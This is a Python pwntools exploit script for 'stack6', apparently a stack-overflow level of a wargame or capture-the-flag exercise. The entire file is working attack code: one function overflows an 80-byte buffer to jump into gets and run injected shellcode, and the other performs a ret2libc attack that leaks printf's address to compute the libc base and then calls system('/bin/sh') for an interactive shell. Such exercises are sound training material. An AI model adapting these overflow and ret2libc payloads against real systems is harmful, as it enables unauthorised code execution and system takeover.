from pwn import *
r = process('./stack6')

def shellcode():
	shelladdr = 0x08049000
	gets = 0x8048380
	shellcode = asm(shellcraft.sh())
	payload = "A"*80 
	payload += p32(gets) 
	payload += p32(shelladdr) 
	payload += p32(shelladdr)
	r.sendline(payload)
	r.sendline(shellcode)
	r.interactive()


def ret2libc():
	printf_plt = 0x80483c0
	printf_got = 0x804970c
	offset_printf = 0x49670
	offset_sys = 0x3ada0
	offset_binsh = 0x15ba0b
	main = 0x080484fa 
	payload = "A"*80
	payload += p32(printf_plt) 
	payload += p32(main) 
	payload += p32(printf_got)
	r.sendline(payload)
	r.recvuntil("\n")
	printf = u32(r.recv(4))
	base = printf - offset_printf
	sys = base + offset_sys
	binsh = base + offset_binsh
	payload = "A"*72
	payload += p32(sys) 
	payload += p32(main) 
	payload += p32(binsh)
	r.sendline(payload)
	r.interactive()